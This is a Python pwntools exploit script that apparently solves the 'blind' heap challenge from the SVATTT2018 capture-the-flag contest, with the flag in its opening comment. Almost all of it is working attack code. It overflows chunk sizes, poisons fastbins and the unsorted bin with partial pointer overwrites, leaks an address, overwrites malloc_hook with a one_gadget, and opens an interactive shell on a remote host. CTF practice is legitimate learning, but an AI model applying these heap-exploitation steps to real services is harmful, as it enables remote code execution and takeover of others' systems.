#SVATTT2018{H3ll0_bl1nd_pwn3r_n1nj4}
#fastbins attack to nearby malloc_hook -> unsortedbins attack to malloc_hook -> Brute onegadget
from pwn import *

def Add(size, index):
    r.recvuntil("Your choice: ")
    r.sendline("1")
    r.recvuntil("Enter size and index of name on scoreboard:")
    r.sendline(str(size)+" "+str(index))

def Edit(index, name):
    r.recvuntil("Your choice: ")
    r.sendline("2")
    r.recvuntil("Enter index of name on scoreboard :")
    r.sendline(str(index))
    r.recvuntil(" :")
    r.send(name)
    
def Del(index):
    r.recvuntil("Your choice: ")
    r.sendline("3")
    r.recvuntil("Enter name index to delete:")
    r.sendline(str(index))


#r = process('./blind')
r = remote("171.244.141.213", 56746)
Add(0xf8, 0)
Add(0x300, 40)
Del(40)
Add(0x20, 1)
Add(0x60, 2)
Add(0x20, 3)
Add(0x20, 4)

Edit(0, "\x00"*0xf8+"\xd1")
Del(1)
Del(2)

Add(0x20, 5)
Edit(40, p64(0)*5+p64(0x71)+"\xed\x1a")
Add(0x60, 6)
Add(0x60, 7) #malloc_hook

Edit(40, p64(0)*5+p64(0xa1))

Add(0x80, 8)

Add(0x18, 9)
Add(0x20, 10)
Add(0x40, 11)
Add(0x40, 12)
Add(0x40, 13)
Add(0x40, 14)

Del(11)
Del(12)

Edit(11, p64(0)*2+p64(0x51))
Edit(12, "\x68")
Add(0x40, 15)
Add(0x40, 16) #Fake


Edit(9, "\x00"*0x18+"\xd1")
Del(10)
Add(0x30, 17)
Edit(16, "\x00\x1b")
Add(0x80, 18)

r.recvuntil("Your choice: ")
r.sendline("4")
r.recvuntil("This ")
leak = int(r.recvuntil(" ")[:-1])
addr = ((leak-1) << 16) + 0xe147
Edit(7, "\x00"*0x13+p32(addr)[:-1])

Add(0x20, 1)

"""
Add(0x30, 3)
Add(0x10, 4)
Add(0x100, 5)
Add(0x100, 5)
Del(2) #ahihi
Del(3)
Edit(2, p64(0)*2+p64(0x41))
Edit(3, "\x48")
Add(0x30, 7)
Add(0x30, 8) #fake
Edit(0, "\x00"*0xf8+"\xd1")
Del(1)
Add(0x30, 9)
Edit(8, "\x98\x37")
Add(0x80, 10)
Edit(8, "\x78\x1b")
Add(0x30, 20)
"""
r.interactive()
